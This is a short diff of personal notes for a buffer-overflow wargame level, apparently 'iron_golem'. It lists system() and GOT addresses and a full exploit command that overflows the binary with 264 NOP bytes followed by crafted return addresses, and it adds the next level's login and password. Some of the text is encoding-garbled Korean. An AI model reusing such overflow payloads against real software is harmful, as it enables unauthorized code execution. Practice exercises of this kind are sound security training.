@@ -6,20 +6,20 @@
 	0x7507c0
 </systemÀÇ ÁÖ¼Ò>
 
-<fake ebp>
-	to 0x8048521
-	0x8048529: 0x25730a00
-</fake ebp>
-
 <first printf>
 	plt: 0x80482f8
-	got: 0x8049628
-	got - 8: 0x8049620
+	got: 0x804962c
+	got - 8: 0x8049624
 	0x804962c: 0x804830e
 <command>
-	./iron_golem "$(for x in `seq 1 264`; do printf "\x90"; done)$(printf "\x20\x96\x04\x08")$(printf "\xc3\x07\x75\x00")"
+	./iron_golem "$(for x in `seq 1 264`; do printf "\x90"; done)$(printf "\x24\x96\x04\x08")$(printf "\xc3\x07\x75\x00")"
 </command>
 
 <file name>
-	\x55\x89\xe5\x8d\x45\x0c\x53\x83\xec\x0c\x8b\x4d\x08\xe8\xff\x25\xfd\xff\x81\xc3\x82
+	\x68\x10
 </file name>
+
+<next>
+	id: iron_golem
+	pw: blood on the fedora
+</next>
